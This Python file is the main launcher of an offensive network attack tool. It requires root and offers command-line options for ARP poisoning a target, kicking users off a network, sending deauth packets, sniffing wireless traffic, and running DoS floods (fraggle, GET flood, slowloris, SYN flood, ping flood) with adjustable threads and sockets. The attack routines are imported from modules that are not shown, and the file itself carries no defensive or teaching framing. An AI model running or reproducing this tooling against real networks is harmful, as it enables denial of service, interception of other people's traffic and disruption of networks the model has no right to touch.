import argparse
import os
from lib.access import *
from lib.kick import *
from lib.DoS import *
from lib.recon import *
from lib.attack import *
from lib.mitm import *
from lib.colors import *

logging.basicConfig(level=logging.DEBUG, format="[{0}%(levelname)s{1}][{2}%(asctime)s{1}]{3}%(message)s{1}".format(LGREEN, RST, BLUE, RD), datefmt="%H:%M:%S")


if os.geteuid() != 0:
    print("Please run as root: sudo {} [OPTION]".format(sys.argv[0]))
    sys.exit(1)

try:
    import netifaces
except:
    os.system('pip3 install netifaces > /dev/null')
    import netifaces

banner = '''{0}
 ___________   __       __   ___  _______    ______  ___      ___  _______   _______
("     _   ") /""\     |/"| /  ")/"     "|  /    " \|"  \    /"  |/"     "| /"      |
 )__/  \ __/ /    \    (: |/   /(: ______) // ____   \   \  //  /(: ______)|:        |
    \ _ /   /' /\  \   |    __/  \/    |  /  /    ) :)\   \/. ./  \/    |  |_____/   ){1}
    |.  |  //  __'  \  (// _  \  // ___)_(: (____/ //  \.    //   // ___)_  //      /
    \:  | /   /  \   \ |: | \  \(:      "|\        /    \    /   (:      "||:  __   |
     \__|(___/    \___)(__|  \__)\_______) \ _____/      \__/     \_______)|__|  \___)
                                
                                ~Nothing is invulnerable~
{2}
'''.format(LCYAN, CY, RST)

checking = []

def monitor_mode(iface):
    logging.info(" Turning on monitor mode...")
    ans = os.system("airmong-ng check kill")
    if ans == 32512:
        logging.warning(" aircrack-ng not installed")
        logging.info(" Trying other option...")
        os.system("ifconfig {} down".format(iface))
        os.system("iwconfig {} mode monitor".format(iface))
        os.system("ifconfig {} up".format(iface))
    else:
        os.system("airmong-ng start {}".format(iface))
    checking.append("X")
    if len(checking) > 1:
        logging.warning(" Couldn't get interface into monitor mode.") 
        logging.info(" Exiting...")
        sys.exit(1)
    checkinterface()

def checkinterface():
    ifaces = netifaces.interfaces()
    wlan = ''
    for i in ifaces:
        if i.startswith("wl") or i.startswith("ath"):
            wlan = i  
    if wlan == '':
        wlan = ifaces[2]
    if "mon" in wlan:
        return wlan
    else:
        monitor_mode(wlan)

def Main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-s", "--spoof", help="ARP", metavar='')
    parser.add_argument("-t", "--target", help="Target to attack", metavar='')
    parser.add_argument("-i", "--interface", help="Interface to use", metavar='')
    parser.add_argument("-k", "--kick", help="Kick one/multiple/all people off your network", metavar='')
    parser.add_argument("-d", "--deauth", help="Send deauth packets to target", metavar='')
    parser.add_argument("-ws", "--wlansniff", help="Wireless sniffer to sniff AP's", action='store_true')
    parser.add_argument("-D", "--DoS", help="DoS attacks (fraggle [LAN], pingflood, GETflood, SYNflood, slowloris)", metavar='')
    parser.add_argument("-T", "--threads", help="Enter how many threads for DoS attack (default=20)", type=int, metavar='')
    parser.add_argument("-p", "--port", help="Port to perform attack on", type=int, metavar='')
    parser.add_argument("-S", "--sockets", help="Number of sockets to generate for slowloris attack (default=100)", type=int, metavar='')
    parser.add_argument("-g", "--gateway", help="insert IP of gateway", metavar='')
    args = parser.parse_args()
    print(banner)
    if args.spoof == "ARP" and args.target:
        if args.gateway:
            gateway = args.gateway
        else:
            gateway = gatewayIP()
        logging.debug(" Starting ARP poisoning on target: {1}{0}{2}".format(args.target, LRED, RST))
        arpattack(args.target, gateway)
    if args.kick == "one" and args.target:
        logging.debug(" Selected: kick one")
        kick = kickout(args.target)
        kick.main()
    if args.wlansniff:
        os.system('clear')
        print(banner)
        logging.debug(" Selected Wireless Sniffing")
        if args.interface:
            time.sleep(0.5)
            inface = args.interface
        else:
            inface = checkinterface()
            logging.debug(" Interface: {}\n".format(inface))
        wsniffer = wireless(inface)
        wsniffer.Main()
    if args.DoS and args.target:
        dos = args.DoS
        tgt = args.target
        if args.port:
            port = args.port
        else:
            port = 80
        if args.sockets:
            socks = args.sockets
        else:
            socks = 100
        if not args.threads:
            threads = 20
        else:
            threads = args.threads
        logging.info(" Using {} threads".format(threads))
        if dos == "fraggle":
            logging.debug(" Selected fraggle attack")
            DOSthread(fraggle, tgt, threads)
        elif dos == "GETflood":
            logging.debug(" Selected GET flood attack")
            DOSthread(GETflood, tgt, threads)
        elif dos == "slowloris":
            logging.debug(" Selected slowloris attack")
            slowloris(tgt, socks)
        elif dos == "SYNflood":
            logging.debug(" Selected SYN flood attack")
            DOSthread(synflood, tgt, threads, port=port)
        elif dos == "pingflood":
            logging.debug(" Selected ping flood attack")
            DOSthread(pingflood, tgt, threads)

if __name__ == '__main__':
    Main()
